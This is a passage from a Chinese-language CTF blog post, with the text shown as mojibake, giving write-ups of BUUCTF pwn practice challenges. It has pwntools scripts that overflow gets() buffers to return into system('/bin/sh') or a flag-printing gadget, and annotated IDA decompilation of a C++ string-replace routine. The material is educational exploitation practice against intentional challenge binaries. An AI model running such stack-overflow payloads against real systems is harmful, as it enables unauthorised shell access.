          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="arttnba3">
      <meta itemprop="description" content="- åšäº†å…³äºä½ çš„æ¢¦ï¼Œæ‰€ä»¥ä¸æ„¿é†’æ¥å‘¢ -">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="arttnba3's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ã€CTFé¢˜è§£-0x04ã€‘BUUCTF-Pwn write up by arttnb3
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-08 02:09:30" itemprop="dateCreated datePublished" datetime="2020-09-08T02:09:30+08:00">2020-09-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-12 01:24:11" itemprop="dateModified" datetime="2020-12-12T01:24:11+08:00">2020-12-12</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="0x000-ç»ªè®º"><a href="#0x000-ç»ªè®º" class="headerlink" title="0x000.ç»ªè®º"></a>0x000.ç»ªè®º</h1><p><a href="buuoj.cn">BUUCTF</a>æ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜</p>
<p>æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆ<del>å“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦</del>ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆ<del>å¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD</del></p>
<p>Baby Pwneråšçš„éƒ½æ˜¯pwné¢˜ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡</p>
<blockquote>
<p>æ³¨ï¼šæˆ‘ä¼šåœ¨é¢˜ç›®çš„æ—è¾¹å†™ä¸Šè€ƒç‚¹</p>
</blockquote>
<a id="more"></a>

<h1 id="0x001-test-your-nc-nc"><a href="#0x001-test-your-nc-nc" class="headerlink" title="0x001.test your nc - nc"></a>0x001.test your nc - nc</h1><p>æ‹–å…¥IDAåˆ†æï¼Œå‘ç°ä¸€è¿è¡Œå°±èƒ½ç›´æ¥getshell</p>
<p><img src="https://i.loli.net/2020/08/15/AqJPwtME8FmvHos.png" alt="image.png"></p>
<p>ncï¼ŒæˆåŠŸgetshellï¼Œå¾—flag</p>
<p><img src="https://i.loli.net/2020/08/15/5Ze2Nw94jmRxUJF.png" alt="image.png"></p>
<h1 id="0x002-rip-ret2text"><a href="#0x002-rip-ret2text" class="headerlink" title="0x002.rip - ret2text"></a>0x002.rip - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³</p>
<p><img src="https://i.loli.net/2020/08/14/HPO2siU8DpyfnYG.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä½¿ç”¨äº†getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œåç§»é‡ä¸º0xf+8ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/08/14/NxMSvtUf7wZ9iY4.png" alt="image.png"></p>
<p>å¯ä»¥å‘ç°ç›´æ¥å­˜åœ¨ä¸€ä¸ª<code>system(&quot;/bin/sh&quot;)</code>ï¼Œè¿”å›åˆ°è¿™é‡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/08/14/rhUu8p2mc6MyXsi.png" alt="image.png"></p>
<p>æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b'A'</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x40118a</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./rip'</span>)<span class="comment">#p = remote('node3.buuoj.cn',26914)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>è¾“å…¥æˆ‘ä»¬çš„<code>payload</code>ï¼Œç›´æ¥getshellï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/08/14/7fGrIXzylhN49YM.png" alt="image.png"></p>
<h1 id="0x003-warmup-csaw-2016-ret2text"><a href="#0x003-warmup-csaw-2016-ret2text" class="headerlink" title="0x003.warmup_csaw_2016 - ret2text"></a>0x003.warmup_csaw_2016 - ret2text</h1><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸º</p>
<p><img src="https://i.loli.net/2020/08/15/2Oy9SNjZuKEI75t.png" alt="image.png"></p>
<p>æ‹–å…¥IDAï¼Œå‘ç°å¯ä»¥æº¢å‡ºçš„<code>gets</code>å‡½æ•°ï¼Œåç§»é‡æ˜¯0x40+8ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/08/15/UcPklJTz8G5brHx.png" alt="image.png"></p>
<p>åˆå‘ç°ä¸€ä¸ªå¯ä»¥è·å¾—flagçš„gadget<code>system(&quot;cat flag.txt&quot;)</code>ï¼Œæ§åˆ¶ç¨‹åºè¿”å›åˆ°è¿™é‡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/08/15/KLPE8bTj2kWszU3.png" alt="image.png"></p>
<p>æ•…æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b'A'</span>* (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x400611</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./warm_up_2016'</span>)<span class="comment"># p = remote('node3.buuoj.cn',28660)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥æˆ‘ä»¬çš„payloadï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/08/15/V6ZjsuOYfCUhMLJ.png" alt="image.png"></p>
<h1 id="0x004-pwn1-sctf-2016-ret2text"><a href="#0x004-pwn1-sctf-2016-ret2text" class="headerlink" title="0x004.pwn1_sctf_2016 - ret2text"></a>0x004.pwn1_sctf_2016 - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/07/NAUM59LC7FSuZ6V.png" alt="image.png"></p>
<p>æ‹–å…¥IDAçœ‹ä¸€ä¸‹ï¼Œ<del>ç„¶åä½ å°±ä¼šå‘ç°C++é€†å‘å‡ºæ¥çš„ä¸œè¥¿æ¯”**è¿˜**</del></p>
<p><img src="https://i.loli.net/2020/09/07/5FsRKWxZSiME8ug.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºreplaceå‡½æ•°æ˜¯åœ¨è¯¥ç¨‹åºä¸­çš„ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆè¿›å»ç®€å•çœ‹çœ‹ï¼š</p>
<p><img src="https://i.loli.net/2020/09/07/vwAz9J8tIlN5DpB.png" alt="image.png"></p>
<p>ç®€å•é€šè¯»ä¸€ä¸‹æˆ‘ä»¬å¤§æ¦‚çŸ¥é“è¿™æ®µä»£ç çš„è¿è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼šï¼ˆ<del>ä¸å°±æ˜¯**ğŸæœ‰ä»€ä¹ˆè¯»ä¸æ‡‚çš„ï¼Œå¹²ä»–å°±å®Œäº‹äº†</del></p>
<p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> *__stdcall <span class="title">replace</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> *a1, <span class="built_in">std</span>::<span class="built_in">string</span> *a2, <span class="built_in">std</span>::<span class="built_in">string</span> *a3, <span class="built_in">std</span>::<span class="built_in">string</span> *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+1Bh] [ebp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+2Fh] [ebp-29h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+30h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+34h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+38h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+44h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">                                                <span class="comment">// æ¥æ”¶å‚æ•°ä¸ºï¼šv6,input,v9,v7</span></span><br><span class="line">                                                <span class="comment">// å…¶ä¸­inputä¸ºæˆ‘ä»¬çš„è¾“å…¥ï¼Œv9ä¸ºå­—ç¬¦ä¸²"I"ï¼Œv7ä¸ºå­—ç¬¦ä¸²"you"</span></span><br><span class="line">                                                <span class="comment">// æŸ¥æ±‡ç¼–æºç å¯çŸ¥ä¸‹é¢çš„stringåŸºæœ¬éƒ½æ˜¯a2ï¼Œä¹Ÿå°±æ˜¯input</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>) != <span class="number">-1</span> )  <span class="comment">// åœ¨inputä¸­å¯»æ‰¾å­—ç¬¦ä¸²v9ï¼ˆ"I"ï¼‰ï¼Œå¦‚æœæ‰¾ä¸åˆ°åˆ™findæ–¹æ³•ä¼šè¿”å›-1ï¼Œè·³å‡ºå¾ªç¯</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v10);      <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v10</span></span><br><span class="line">    v11 = <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// è·å¾—"I"å­—ç¬¦ä¸²åœ¨inputä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ ‡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">begin</span>(&amp;v12);                   <span class="comment">// input.begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v12</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::<span class="keyword">operator</span>+(&amp;v13);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v13</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">begin</span>(&amp;v14);                   <span class="comment">// input.begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v14</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;&gt;(&amp;v9, v14, v13, &amp;v10);<span class="comment">// v14è¿­ä»£ç”Ÿæˆçš„å­—ç¬¦ä½¿ç”¨allocatorï¼ˆv10ï¼‰åˆ†é…å†…å­˜ã€ä½¿ç”¨operator+ï¼ˆv13ï¼‰æ¥æˆæ–°å­—ç¬¦ä¸²ç»™åˆ°v8</span></span><br><span class="line">                                                <span class="comment">// æŸ¥çœ‹æ±‡ç¼–å¯çŸ¥ç”Ÿæˆçš„å­—ç¬¦ä¸²é•¿åº¦ä¸ºv11ï¼ˆå³ç”Ÿæˆçš„å­—ç¬¦ä¸²ä¸ºinputä¸­ç¬¬ä¸€ä¸ª"I"çš„å‰é¢æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v10, v4); <span class="comment">// ææ„v10</span></span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v15);      <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">end</span>(&amp;v16);                     <span class="comment">// input.end()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v16</span></span><br><span class="line">    v17 = <span class="built_in">std</span>::<span class="built_in">string</span>::length(a3);              <span class="comment">// è·å¾—"I"çš„é•¿åº¦ç»™åˆ°v17</span></span><br><span class="line">    v19 = <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// è·å¾—"I"å­—ç¬¦ä¸²åœ¨inputä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ ‡ç»™åˆ°v19</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">begin</span>(&amp;v20);                   <span class="comment">// begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v20</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::<span class="keyword">operator</span>+(&amp;v18);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v18</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::<span class="keyword">operator</span>+(&amp;v21);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v21</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;&gt;(&amp;v8, v21, v16, &amp;v15);<span class="comment">// v16è¿­ä»£ç”Ÿæˆçš„å­—ç¬¦ä½¿ç”¨allocatorï¼ˆv15ï¼‰åˆ†é…å†…å­˜ã€ä½¿ç”¨operator+ï¼ˆv21ï¼‰æ¥æˆæ–°å­—ç¬¦ä¸²ç»™åˆ°v8</span></span><br><span class="line">                                                <span class="comment">// æ³¨æ„åœ¨è¿™é‡Œå’Œå‰é¢çš„ç›¸ä¼¼è¯­å¥ä¸­å­—ç¬¦ä¸²è¿­ä»£å™¨ä¸operatoræ‰€ä¼ å…¥çš„ä½ç½®æ˜¯ç›¸åçš„</span></span><br><span class="line">                                                <span class="comment">// å¯èƒ½æ˜¯å› ä¸ºè¿­ä»£å™¨ä»åå¾€å‰ç”Ÿæˆå­—ç¬¦ä¸²ï¼Ÿ</span></span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v15, v5); <span class="comment">// ææ„v15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v23, &amp;v9, a4);<span class="comment">// v9+a4ç”Ÿæˆçš„å­—ç¬¦ä¸²ç»™åˆ°v23</span></span><br><span class="line">                                                <span class="comment">// å³inputä¸­ç¬¬ä¸€ä¸ª"I"ä¹‹å‰çš„æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²å†åŠ ä¸Š"you"ç”Ÿæˆæ–°å­—ç¬¦ä¸²v23</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v22, &amp;v23, &amp;v8);<span class="comment">// v23+v8ç”Ÿæˆçš„å­—ç¬¦ä¸²ç»™åˆ°v22</span></span><br><span class="line">                                                <span class="comment">// å³v23å†åŠ ä¸ŠåŸinputä¸­ç¬¬ä¸€ä¸ª"I"ä¹‹åçš„æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²ç”Ÿæˆæ–°å­—ç¬¦ä¸²v22</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(a2, &amp;v22, v6);       <span class="comment">// v22ç»™å›åˆ°a2ï¼ˆä¹Ÿå°±æ˜¯input</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v22);                 <span class="comment">// ææ„v20</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v23);                 <span class="comment">// ææ„v21</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v8);                  <span class="comment">// ææ„v8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;v9);                  <span class="comment">// ææ„v9</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(a1, a2);                  <span class="comment">// æ‹·è´inputåˆ°a1ï¼ˆvulnä¸­v6ï¼‰</span></span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å¤§æ¦‚çŸ¥é“replaceå‡½æ•°çš„ä½œç”¨å…¶å®æ˜¯æŠŠ<strong>è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ä¸²Aæ›¿æ¢æˆå­—ç¬¦ä¸²Bå†é‡æ–°ç”Ÿæˆæ–°çš„å­—ç¬¦ä¸²</strong>ï¼Œè€Œåœ¨vulnå‡½æ•°ä¸­Aå³ä¸º<code>&quot;I&quot;</code>ï¼ŒBå³ä¸º<code>&quot;you&quot;</code>ã€‚</p>
<p>é‡æ–°å›åˆ°<code>vuln</code>å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°ä¾ç„¶çœ‹ä¸æ‡‚è¿™æ®µä»£ç åˆ°åº•å¹²äº†å•¥</p>
<p>è¿™ä¸ªæ—¶å€™å…¶å®æˆ‘ä»¬å¯ä»¥é€‰æ‹©çœ‹æ±‡ç¼–ä»£ç è¿›è¡Œè¾…åŠ©é˜…è¯»ï¼ˆ<del>C++é€†å‘å‡ºæ¥çš„ä¸œè¥¿çœŸçš„å¤ª**äº†</del></p>
<p><img src="https://i.loli.net/2020/09/07/SCp5I7mvXc9HDWQ.png" alt="image.png"></p>
<p>ç®€å•ç»“åˆä¸€ä¸‹æ±‡ç¼–ä»£ç ä¸é€†å‘å‡ºæ¥çš„C++ä»£ç ï¼Œæˆ‘ä»¬å®¹æ˜“çŸ¥é“è¯¥æ®µä»£ç çš„ä½œç”¨ï¼Œå¦‚ä¸‹å›¾æ³¨é‡Šæ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2020/09/07/vTxCYDnofhqdSKQ.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, <span class="number">32</span>, edata);                         <span class="comment">// ä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å…¥æœ€å¤§32ä¸ªå­—ç¬¦åˆ°s</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, &amp;s);           <span class="comment">// å°†å­—ç¬¦ä¸²sçš„å€¼æ‹·è´åˆ°stringç±»inputä¸­</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator((<span class="keyword">int</span>)&amp;v8);    <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v8</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>((<span class="keyword">int</span>)&amp;v7, (<span class="keyword">int</span>)<span class="string">"you"</span>, (<span class="keyword">int</span>)&amp;v8);<span class="comment">// stringç±»ä½¿ç”¨allocratoråˆ†é…å†…å­˜å¤åˆ¶å­—ç¬¦ä¸²"you"å¹¶æ‹·è´åˆ°v7ä¸Š</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator((<span class="keyword">int</span>)&amp;v10);   <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>((<span class="keyword">int</span>)&amp;v9, (<span class="keyword">int</span>)<span class="string">"I"</span>, (<span class="keyword">int</span>)&amp;v10);<span class="comment">// stringç±»ä½¿ç”¨allocratoråˆ†é…å†…å­˜å¤åˆ¶å­—ç¬¦ä¸²"I"å¹¶æ‹·è´åˆ°v6ä¸Š</span></span><br><span class="line">replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6, (<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input, (<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v9);<span class="comment">// éå†inputï¼Œç”Ÿæˆæ–°stringæŠŠåŸinputä¸­çš„'I'æ›¿æ¢ä¸º'you'ï¼Œå¹¶å°†é‡æ–°ç”Ÿæˆåçš„å­—ç¬¦ä¸²åœ°å€ç»™åˆ°v6</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, &amp;v6, v0);      <span class="comment">// æ‹·è´v6å›åˆ°inputä¸­ï¼Œå®Œæˆæ›¿æ¢</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6);     <span class="comment">// ææ„v6</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v9);     <span class="comment">// ææ„v9</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v10, v1);   <span class="comment">// ææ„v10</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v7);     <span class="comment">// ææ„v7</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v8, v2);    <span class="comment">// ææ„v8</span></span><br><span class="line">v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);<span class="comment">// å°†inputä½¿ç”¨stringç±»çš„c_strå‡½æ•°å˜æˆå­—ç¬¦ä¸²å­˜æ”¾åœ¨charæ•°ç»„ä¸­å¹¶å°†å­—ç¬¦ä¸²æŒ‡é’ˆèµ‹ç»™v3</span></span><br><span class="line"><span class="built_in">strcpy</span>(&amp;s, v3);                               <span class="comment">// 